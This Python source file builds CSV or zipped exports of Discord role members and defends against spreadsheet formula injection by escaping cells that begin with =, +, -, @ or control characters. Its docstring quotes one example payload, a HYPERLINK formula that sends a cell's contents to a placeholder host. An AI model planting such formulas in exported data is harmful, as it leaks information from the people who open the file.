from __future__ import annotations

import csv
from collections.abc import Iterable, Sequence
from dataclasses import dataclass
from io import BytesIO, StringIO
from zipfile import ZIP_DEFLATED, ZipFile


class ExportTooLarge(RuntimeError):
    def __init__(self, csv_size: int, zip_size: int, upload_limit: int) -> None:
        super().__init__("Export is too large to upload")
        self.csv_size = csv_size
        self.zip_size = zip_size
        self.upload_limit = upload_limit


@dataclass(frozen=True, slots=True)
class ExportMember:
    user_id: int
    username: str
    display_name: str


@dataclass(frozen=True, slots=True)
class ExportPayload:
    filename: str
    data: bytes


_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _neutralize_formula(value: str) -> str:
    """Stop spreadsheets from evaluating a Discord name as a formula.

    Usernames and display names are attacker-controlled, so a name such as
    ``=HYPERLINK("http://example.invalid/"&A1,"x")`` would execute when the
    export is opened in Excel or LibreOffice. Prefixing with an apostrophe
    keeps the cell text intact while forcing it to be read as a literal.
    """
    if value.startswith(_FORMULA_PREFIXES):
        return f"'{value}"
    return value


def _build_csv(
    headers: Sequence[str],
    rows: Iterable[Sequence[object]],
) -> bytes:
    output = StringIO(newline="")
    writer = csv.writer(output, lineterminator="\n")
    writer.writerow(headers)
    writer.writerows(
        tuple(
            _neutralize_formula(value) if isinstance(value, str) else value
            for value in row
        )
        for row in rows
    )
    return output.getvalue().encode("utf-8")


def build_csv_export(
    headers: Sequence[str],
    rows: Iterable[Sequence[object]],
    upload_limit: int,
    stem: str,
) -> ExportPayload:
    csv_data = _build_csv(headers, rows)
    if len(csv_data) <= upload_limit:
        return ExportPayload(f"{stem}.csv", csv_data)
    buffer = BytesIO()
    with ZipFile(buffer, "w", compression=ZIP_DEFLATED) as archive:
        archive.writestr(f"{stem}.csv", csv_data)
    zip_data = buffer.getvalue()
    if len(zip_data) > upload_limit:
        raise ExportTooLarge(len(csv_data), len(zip_data), upload_limit)
    return ExportPayload(f"{stem}.zip", zip_data)


def build_role_export(
    members: Sequence[ExportMember],
    upload_limit: int,
    stem: str = "roleusers",
) -> ExportPayload:
    return build_csv_export(
        ("user_id", "username", "display_name"),
        (
            (member.user_id, member.username, member.display_name)
            for member in members
        ),
        upload_limit,
        stem,
    )
